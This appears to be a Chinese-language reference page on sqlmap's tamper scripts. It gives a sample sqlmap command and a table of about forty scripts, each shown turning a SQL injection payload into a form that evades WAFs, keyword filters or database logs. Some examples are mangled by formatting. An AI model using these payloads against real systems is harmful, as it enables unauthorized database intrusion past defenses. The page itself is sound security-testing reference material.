# tamper

1、tamper的作用：  
使用SQLMap提供的tamper脚本，可在一定程度上避开应用程序的敏感字符过滤、绕过WAF规则的阻挡，继而进行渗透攻击。

2、WAF是啥？

* WAF：Web应用程序防火墙，Web Application Firewall
* IPS：入侵防御系统， Intrusion Prevention System
* IDS：入侵检测系统，Intrusion Detection System

3、tamper用法

--tamper=TAMPER 利用给定的脚本进行篡改注入数据。其用法可举例说明：

sqlmap.py -u "[http://.../?uname=admin&pwd=pass123](http://.../?uname=admin&pwd=pass123)" --level=5 --risk=3 -p "uname" --tamper=xxx.py

表示对指定的url地址，以所设置的level等级、risk等级，并采用选定的tamper篡改脚本对参数“uname”进行检测

sqlmap中所有的tamper：

各种tamper的适用范围如下图所示：

![](../../.gitbook/assets/image%20%282%29.png)

各tamper的大意如下表格所示：

<table>
  <thead>
    <tr>
      <th style="text-align:left">tamper</th>
      <th style="text-align:left">&#x529F;&#x80FD;</th>
      <th style="text-align:left">&#x4E3E;&#x4F8B;</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align:left">apostrophemask.py</td>
      <td style="text-align:left">&#x5BF9;&#x5F15;&#x53F7;&#x8FDB;&#x884C;utf-8&#x683C;&#x5F0F;&#x7F16;&#x7801;(%EF%BC%87)</td>
      <td
      style="text-align:left">1 AND &apos;1&apos;=&apos;1 ==&gt; 1 AND %EF%BC%871%EF%BC%87=%EF%BC%871</td>
    </tr>
    <tr>
      <td style="text-align:left">apostrophenullencode.py</td>
      <td style="text-align:left">&#x7528;&#x975E;&#x6CD5;&#x7684;&#x53CC;unicode&#x5B57;&#x7B26;(%00%27)&#x66FF;&#x6362;&#x5F15;&#x53F7;&#x5B57;&#x7B26;</td>
      <td
      style="text-align:left">1 AND &apos;1&apos;=&apos;1 ==&gt; 1 AND %00%271%00%27=%00%271</td>
    </tr>
    <tr>
      <td style="text-align:left">appendnullbyte.py</td>
      <td style="text-align:left">&#x5728;&#x6709;&#x6548;&#x8F7D;&#x8377;&#x7ED3;&#x675F;&#x4F4D;&#x7F6E;&#x52A0;&#x8F7D;&#x96F6;&#x5B57;&#x8282;&#x5B57;&#x7B26;&#x7F16;&#x7801;</td>
      <td
      style="text-align:left">1 AND 1=1 ==&gt; 1 AND 1=1%00</td>
    </tr>
    <tr>
      <td style="text-align:left">base64encode.py</td>
      <td style="text-align:left">&#x7528;base64&#x683C;&#x5F0F;&#x8FDB;&#x884C;&#x7F16;&#x7801;</td>
      <td
      style="text-align:left">1&apos; AND SLEEP(5)# ==&gt; MScgQU5EIFNMRUVQKDUpIw==</td>
    </tr>
    <tr>
      <td style="text-align:left">between.py</td>
      <td style="text-align:left">&#x7528;between&#x66FF;&#x6362;&#x5927;&#x4E8E;&#x53F7;&#xFF08;&gt;&#xFF09;</td>
      <td
      style="text-align:left">
        <p>1 AND A &gt; B --&#x200A; ==&gt; 1 AND A NOT BETWEEN 0 AND B&#x200A; --</p>
        <p>1 AND A = B --&#x200A; ==&gt; 1 AND A BETWEEN B AND B --</p>
        </td>
    </tr>
    <tr>
      <td style="text-align:left">bluecoat.py</td>
      <td style="text-align:left">&#x5BF9;SQL&#x8BED;&#x53E5;&#x66FF;&#x6362;&#x7A7A;&#x683C;&#x5B57;&#x7B26;&#x4E3A;(%09)&#xFF0C;&#x5E76;&#x66FF;&#x6362;&quot;=&quot;---&gt;&quot;LIKE&quot;</td>
      <td
      style="text-align:left">SELECT username FROM users WHERE id = 1 ==&gt; SELECT%09username FROM%09users
        WHERE%09id LIKE 1</td>
    </tr>
    <tr>
      <td style="text-align:left">apostrophemask.py</td>
      <td style="text-align:left">&#x7528;utf-8&#x683C;&#x5F0F;&#x7F16;&#x7801;&#x5F15;&#x53F7;(&#x5982;&#xFF1A;%EF%BC%87)</td>
      <td
      style="text-align:left">1 AND &apos;1&apos;=&apos;1 ==&gt; 1 AND %EF%BC%871%EF%BC%87=%EF%BC%871</td>
    </tr>
    <tr>
      <td style="text-align:left">charunicodeencode.py</td>
      <td style="text-align:left">&#x5BF9;&#x5B57;&#x7B26;&#x4E32;&#x8FDB;&#x884C;Unicode&#x683C;&#x5F0F;&#x8F6C;&#x4E49;&#x7F16;&#x7801;</td>
      <td
      style="text-align:left">SELECT FIELD%20FROM TABLE ==&gt; %u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045</td>
    </tr>
    <tr>
      <td style="text-align:left">charencode.py</td>
      <td style="text-align:left">&#x91C7;&#x7528;url&#x683C;&#x5F0F;&#x7F16;&#x7801;1&#x6B21;</td>
      <td style="text-align:left">SELECT FIELD FROM%20TABLE ==&gt; %53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45</td>
    </tr>
    <tr>
      <td style="text-align:left">chardoubleencode.py</td>
      <td style="text-align:left">&#x91C7;&#x7528;url&#x683C;&#x5F0F;&#x7F16;&#x7801;2&#x6B21;</td>
      <td style="text-align:left">SELECT FIELD FROM%20TABLE ==&gt; %2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545</td>
    </tr>
    <tr>
      <td style="text-align:left">commalessmid.py</td>
      <td style="text-align:left">&#x5C06;payload&#x4E2D;&#x7684;&#x9017;&#x53F7;&#x7528; from&#x548C;for&#x4EE3;&#x66FF;&#xFF0C;&#x7528;&#x4E8E;&#x8FC7;&#x6EE4;&#x4E86;&#x9017;&#x53F7;&#x5E76;&#x4E14;&#x662F;3&#x4E2A;&#x53C2;&#x6570;&#x7684;&#x60C5;&#x51B5;</td>
      <td
      style="text-align:left">MID(VERSION(), 1, 1) ==&gt; MID(VERSION() FROM 1 FOR 1)</td>
    </tr>
    <tr>
      <td style="text-align:left">concat2concatws.py</td>
      <td style="text-align:left">CONCAT() ==&gt; CONCAT_WS()&#xFF0C;&#x7528;&#x4E8E;&#x8FC7;&#x6EE4;&#x4E86;CONCAT()&#x51FD;&#x6570;&#x7684;&#x60C5;&#x51B5;</td>
      <td
      style="text-align:left">CONCAT(1,2) ==&gt; CONCAT_WS(MID(CHAR(0),0,0),1,2)</td>
    </tr>
    <tr>
      <td style="text-align:left">equaltolike.py</td>
      <td style="text-align:left">= ==&gt; LIKE&#xFF0C;&#x7528;&#x4E8E;&#x8FC7;&#x6EE4;&#x4E86;&#x7B49;&#x53F7;&quot;=&quot;&#x7684;&#x60C5;&#x51B5;</td>
      <td
      style="text-align:left">SELECT <em> FROM users WHERE id=1 ==&gt; SELECT </em> FROM users WHERE id
        LIKE 1</td>
    </tr>
    <tr>
      <td style="text-align:left">greatest.py</td>
      <td style="text-align:left"></td>
      <td style="text-align:left">1 AND A &gt; B ==&gt; 1 AND GREATEST(A, B+1)=A</td>
    </tr>
    <tr>
      <td style="text-align:left">halfversionedmorekeywords.py</td>
      <td style="text-align:left">&#x7A7A;&#x683C; ==&gt; /*!0 &#xFF08;&#x5728;&#x5173;&#x952E;&#x5B57;&#x524D;&#x6DFB;&#x52A0;&#x6CE8;&#x91CA;&#xFF09;</td>
      <td
      style="text-align:left">union ==&gt; /*!0union</td>
    </tr>
    <tr>
      <td style="text-align:left">ifnull2ifisnull.py</td>
      <td style="text-align:left">IFNULL(A, B) ==&gt; IF(ISNULL(A), B, A)</td>
      <td style="text-align:left">IFNULL(1, 2) ==&gt; IF(ISNULL(1),2,1)</td>
    </tr>
    <tr>
      <td style="text-align:left">informationschemacomment.py</td>
      <td style="text-align:left">
        <p>&#x5728; information_schema &#x540E;&#x9762;&#x52A0;&#x4E0A; /**/ &#xFF0C;&#x7528;&#x4E8E;&#x7ED5;&#x8FC7;&#x5BF9;
          information_schema &#x7684;&#x60C5;&#x51B5;</p>
        <p>retVal = re.sub(r&quot;(?i)(information_schema).&quot;, &quot;g&lt;1&gt;/**/.&quot;,
          payload)</p>
      </td>
      <td style="text-align:left">select table_name from information_schema.tables ==&gt; select table_name
        from information_schema/**/.tables</td>
    </tr>
    <tr>
      <td style="text-align:left">lowercase.py</td>
      <td style="text-align:left">&#x5C06; payload &#x91CC;&#x7684;&#x5927;&#x5199;&#x8F6C;&#x4E3A;&#x5C0F;&#x5199;</td>
      <td
      style="text-align:left">SELECT table_name FROM INFORMATION_SCHEMA.TABLES ==&gt; select table_name
        from information_schema.tables</td>
    </tr>
    <tr>
      <td style="text-align:left">modsecurityversioned.py</td>
      <td style="text-align:left">&#x7528;&#x6CE8;&#x91CA;&#x6765;&#x5305;&#x56F4;&#x5B8C;&#x6574;&#x7684;&#x67E5;&#x8BE2;&#x8BED;&#x53E5;&#xFF0C;&#x7528;&#x4E8E;&#x7ED5;&#x8FC7;
        ModSecurity &#x5F00;&#x6E90; waf</td>
      <td style="text-align:left">1 AND 2&gt;1-- ==&gt; 1 /<em>!30874AND 2&gt;1</em>/--</td>
    </tr>
    <tr>
      <td style="text-align:left">modsecurityzeroversioned.py</td>
      <td style="text-align:left">&#x7528;&#x6CE8;&#x91CA;&#x6765;&#x5305;&#x56F4;&#x5B8C;&#x6574;&#x7684;&#x67E5;&#x8BE2;&#x8BED;&#x53E5;&#xFF0C;&#x7528;&#x4E8E;&#x7ED5;&#x8FC7;
        waf &#xFF0C;&#x548C;&#x4E0A;&#x9762;&#x7C7B;&#x4F3C;</td>
      <td style="text-align:left">1 and 2&gt;1--+ ==&gt; 1 /!00000and 2&gt;1/--+</td>
    </tr>
    <tr>
      <td style="text-align:left">multiplespaces.py</td>
      <td style="text-align:left">&#x56F4;&#x7ED5;SQL&#x5173;&#x952E;&#x5B57;&#x6DFB;&#x52A0;&#x591A;&#x4E2A;&#x7A7A;&#x683C;</td>
      <td
      style="text-align:left">1 UNION SELECT foobar ==&gt; 1 UNION SELECT foobar</td>
    </tr>
    <tr>
      <td style="text-align:left">nonrecursivereplacement.py</td>
      <td style="text-align:left">&#x5173;&#x952E;&#x5B57;&#x53CC;&#x5199;&#xFF0C;&#x53EF;&#x7528;&#x4E8E;&#x5173;&#x952E;&#x5B57;&#x8FC7;&#x6EE4;</td>
      <td
      style="text-align:left">1 UNION SELECT 2-- ==&gt; 1 UNIONUNION SELESELECTCT 2--</td>
    </tr>
    <tr>
      <td style="text-align:left">overlongutf8.py</td>
      <td style="text-align:left">&#x8F6C;&#x6362;&#x7ED9;&#x5B9A;&#x7684;payload&#x5F53;&#x4E2D;&#x7684;&#x6240;&#x6709;&#x5B57;&#x7B26;</td>
      <td
      style="text-align:left">SELECT FIELD FROM TABLE WHERE 2&gt;1 ==&gt; SELECT%C0%AAFIELD%C0%AAFROM%C0%AATABLE%C0%AAWHERE%C0%AA2%C0%BE1</td>
    </tr>
    <tr>
      <td style="text-align:left">percentage.py</td>
      <td style="text-align:left">&#x7528;&#x767E;&#x5206;&#x53F7;&#x6765;&#x7ED5;&#x8FC7;&#x5173;&#x952E;&#x5B57;&#x8FC7;&#x6EE4;&#xFF0C;&#x5728;&#x5173;&#x952E;&#x5B57;&#x7684;&#x6BCF;&#x4E2A;&#x5B57;&#x6BCD;&#x524D;&#x9762;&#x90FD;&#x52A0;&#x4E00;&#x4E2A;(%)</td>
      <td
      style="text-align:left">SELECT FIELD FROM TABLE ==&gt; %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</td>
    </tr>
    <tr>
      <td style="text-align:left">randomcase.py</td>
      <td style="text-align:left">&#x5C06; payload &#x968F;&#x673A;&#x5927;&#x5C0F;&#x5199;</td>
      <td style="text-align:left">INSERT ==&gt; InseRt</td>
    </tr>
    <tr>
      <td style="text-align:left">randomcomments.py</td>
      <td style="text-align:left">&#x5728; payload &#x7684;&#x5173;&#x952E;&#x5B57;&#x4E2D;&#x95F4;&#x968F;&#x673A;&#x63D2;&#x5165;&#x6CE8;&#x91CA;&#x7B26;
        /**/ &#xFF0C;&#x53EF;&#x7528;&#x4E8E;&#x7ED5;&#x8FC7;&#x5173;&#x952E;&#x5B57;&#x8FC7;&#x6EE4;</td>
      <td
      style="text-align:left">INSERT ==&gt; I / <b> / N / </b> / SERT</td>
    </tr>
    <tr>
      <td style="text-align:left">securesphere.py</td>
      <td style="text-align:left">&#x5728;payload&#x540E;&#x8FFD;&#x52A0;&#x7279;&#x6B8A;&#x6784;&#x9020;&#x7684;&#x5B57;&#x7B26;&#x4E32;</td>
      <td
      style="text-align:left">1 AND 1=1 ==&gt; 1 AND 1=1 and &apos;0having&apos;=&apos;0having&apos;</td>
    </tr>
    <tr>
      <td style="text-align:left">space2comment.py</td>
      <td style="text-align:left">&#x7528;&#x6CE8;&#x91CA;&#x7B26; // &#x4EE3;&#x66FF;&#x7A7A;&#x683C;&#xFF0C;&#x7528;&#x4E8E;&#x7A7A;&#x683C;&#x7684;&#x7ED5;&#x8FC7;</td>
      <td
      style="text-align:left">SELECT id FROM users ==&gt; SELECT//id//FROM//users</td>
    </tr>
    <tr>
      <td style="text-align:left">space2dash.py</td>
      <td style="text-align:left">&#x7528;[&#x6CE8;&#x91CA;&#x7B26;(--)+&#x4E00;&#x4E2A;&#x968F;&#x673A;&#x5B57;&#x7B26;&#x4E32;+&#x4E00;&#x4E2A;&#x6362;&#x884C;&#x7B26;]&#x66FF;&#x6362;&#x63A7;&#x5236;&#x7B26;</td>
      <td
      style="text-align:left">union select 1,2--+ ==&gt; union--HSHjsJh%0Aselect--HhjHSJ%0A1,2--+</td>
    </tr>
    <tr>
      <td style="text-align:left">space2hash.py</td>
      <td style="text-align:left">&#x7528;[&#x6CE8;&#x91CA;&#x7B26;(#)+&#x4E00;&#x4E2A;&#x968F;&#x673A;&#x5B57;&#x7B26;&#x4E32;+&#x4E00;&#x4E2A;&#x6362;&#x884C;&#x7B26;]&#x66FF;&#x6362;&#x63A7;&#x5236;&#x7B26;</td>
      <td
      style="text-align:left">union select 1,2--+ ==&gt; union%23HSHjsJh%0Aselect%23HhjHSJ%0A1,2--+</td>
    </tr>
    <tr>
      <td style="text-align:left">space2morehash.py</td>
      <td style="text-align:left">&#x7528;&#x591A;&#x4E2A;[&#x6CE8;&#x91CA;&#x7B26;(#)+&#x4E00;&#x4E2A;&#x968F;&#x673A;&#x5B57;&#x7B26;&#x4E32;+&#x4E00;&#x4E2A;&#x6362;&#x884C;&#x7B26;]&#x66FF;&#x6362;&#x63A7;&#x5236;&#x7B26;</td>
      <td
      style="text-align:left">union select 1,2--+ ==&gt; union %23 HSHjsJh %0A select %23 HhjHSJ %0A%23
        HJHJhj %0A 1,2--+</td>
    </tr>
    <tr>
      <td style="text-align:left">space2mssqlblank.py</td>
      <td style="text-align:left">&#x7528;&#x968F;&#x673A;&#x7684;&#x7A7A;&#x767D;&#x7B26;&#x66FF;&#x6362;payload&#x4E2D;&#x7684;&#x7A7A;&#x683C;</td>
      <td
      style="text-align:left">SELECT id FROM users ==&gt; SELECT%0Eid%0DFROM%07users</td>
    </tr>
    <tr>
      <td style="text-align:left">space2mssqlhash.py</td>
      <td style="text-align:left">&#x7528;[&#x5B57;&#x7B26;# +&#x4E00;&#x4E2A;&#x6362;&#x884C;&#x7B26;]&#x66FF;&#x6362;payload&#x4E2D;&#x7684;&#x7A7A;&#x683C;</td>
      <td
      style="text-align:left">union select 1,2--+ ==&gt; union%23%0Aselect%23%0A1,2--+</td>
    </tr>
    <tr>
      <td style="text-align:left">space2plus.py</td>
      <td style="text-align:left">&#x7528;&#x52A0;&#x53F7;(+)&#x66FF;&#x6362;&#x7A7A;&#x683C;</td>
      <td style="text-align:left">SELECT id FROM users ==&gt; SELECT+id+FROM+users</td>
    </tr>
    <tr>
      <td style="text-align:left">space2randomblank.py</td>
      <td style="text-align:left">&#x7528;&#x968F;&#x673A;&#x7684;&#x7A7A;&#x767D;&#x7B26;&#x66FF;&#x6362;payload&#x4E2D;&#x7684;&#x7A7A;&#x683C;</td>
      <td
      style="text-align:left">SELECT id FROM users ==&gt; SELECT%0Did%0DFROM%0Ausers</td>
    </tr>
    <tr>
      <td style="text-align:left">sp_password.py</td>
      <td style="text-align:left">&#x5728;payload&#x8BED;&#x53E5;&#x540E;&#x6DFB;&#x52A0; sp_password &#xFF0C;&#x7528;&#x4E8E;&#x8FF7;&#x60D1;&#x6570;&#x636E;&#x5E93;&#x65E5;&#x5FD7;&#xFF08;Space
        ==&gt; sp_password&#xFF09;</td>
      <td style="text-align:left">1 AND 9227=9227-- ==&gt; 1 AND 9227=9227 -- sp_password</td>
    </tr>
    <tr>
      <td style="text-align:left">symboliclogical.py</td>
      <td style="text-align:left">&#x7528; &amp;&amp; &#x66FF;&#x6362; and &#xFF0C;&#x7528; || &#x66FF;&#x6362;
        or &#xFF0C;&#x7528;&#x4E8E;&#x8FD9;&#x4E9B;&#x5173;&#x952E;&#x5B57;&#x88AB;&#x8FC7;&#x6EE4;&#x7684;&#x60C5;&#x51B5;</td>
      <td
      style="text-align:left">
        <p>1 and 1=1 ==&gt; 1 %26%26 1=1</p>
        <p>1 or 1=1 ==&gt; 1 %7c%7c 1=1</p>
        </td>
    </tr>
    <tr>
      <td style="text-align:left">unionalltounion.py</td>
      <td style="text-align:left">&#x7528; union select &#x66FF;&#x6362;union all select</td>
      <td style="text-align:left">union all select 1,2--+ ==&gt; union select 1,2--+</td>
    </tr>
    <tr>
      <td style="text-align:left">unmagicquotes.py</td>
      <td style="text-align:left">&#x7528;&#x5BBD;&#x5B57;&#x7B26;&#x7ED5;&#x8FC7; GPC addslashes</td>
      <td
      style="text-align:left">1&apos; and 1=1 ==&gt; 1%df%27 and 1=1--</td>
    </tr>
    <tr>
      <td style="text-align:left">uppercase.py</td>
      <td style="text-align:left">&#x5C06;payload&#x4E2D;&#x7684;&#x5C0F;&#x5199;&#x5B57;&#x6BCD;&#x8F6C;&#x4E3A;&#x5927;&#x5199;&#x683C;&#x5F0F;</td>
      <td
      style="text-align:left">insert ==&gt; INSERT</td>
    </tr>
    <tr>
      <td style="text-align:left">varnish.py</td>
      <td style="text-align:left">&#x6DFB;&#x52A0;&#x4E00;&#x4E2A;HTTP&#x5934;&#x201C; X-originating-IP
        &#x201D;&#x6765;&#x7ED5;&#x8FC7;WAF</td>
      <td style="text-align:left"></td>
    </tr>
    <tr>
      <td style="text-align:left">versionedkeywords.py</td>
      <td style="text-align:left">&#x5BF9;&#x975E;&#x51FD;&#x6570;&#x7684;&#x5173;&#x952E;&#x5B57;&#x8FDB;&#x884C;&#x6CE8;&#x91CA;</td>
      <td
      style="text-align:left">1 union select user() ==&gt; 1/!UNION//!SELECT/user()</td>
    </tr>
    <tr>
      <td style="text-align:left">versionedmorekeywords.py</td>
      <td style="text-align:left">&#x5BF9;&#x6BCF;&#x4E2A;&#x5173;&#x952E;&#x5B57;&#x8FDB;&#x884C;&#x6CE8;&#x91CA;&#x5904;&#x7406;</td>
      <td
      style="text-align:left">1 union select user() ==&gt; 1/!UNION//!SELECT/user()</td>
    </tr>
    <tr>
      <td style="text-align:left">xforwardedfor.py</td>
      <td style="text-align:left">&#x6DFB;&#x52A0;&#x4E00;&#x4E2A;&#x4F2A;&#x9020;&#x7684;HTTP&#x5934;&#x201C;
        X-Forwarded-For &#x201D;&#x6765;&#x7ED5;&#x8FC7;WAF</td>
      <td style="text-align:left">headers = kwargs.get(&quot;headers&quot;, {})headers[&quot;X-Forwarded-For&quot;]
        = randomIP()return payload</td>
    </tr>
  </tbody>
</table>

